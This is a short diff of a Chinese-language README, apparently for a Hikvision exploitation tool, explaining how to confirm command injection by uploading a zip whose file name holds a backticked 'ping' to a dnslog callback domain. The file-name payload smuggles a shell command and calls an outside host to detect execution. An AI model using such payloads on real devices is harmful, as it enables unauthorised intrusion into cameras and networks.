@@ -242,10 +242,9 @@ Content-Type: application/zip
 "`ping xxx.dnslog.cn`.zip"
 我们可以用本地的压缩包，要特别注意写法
 那么本地就准备一个zip
-`输入你的dns`.zip
+内置一个dnslog(请勿修改）
 如sdadsad.dnslog.cn
 
-![image](https://github.com/MInggongK/Hikvision-/blob/main/ghf.png)
 然后这样要做精准判断的话
 就是读取自定义的dns信息，随机叠加+自定义信息
 正确写法：
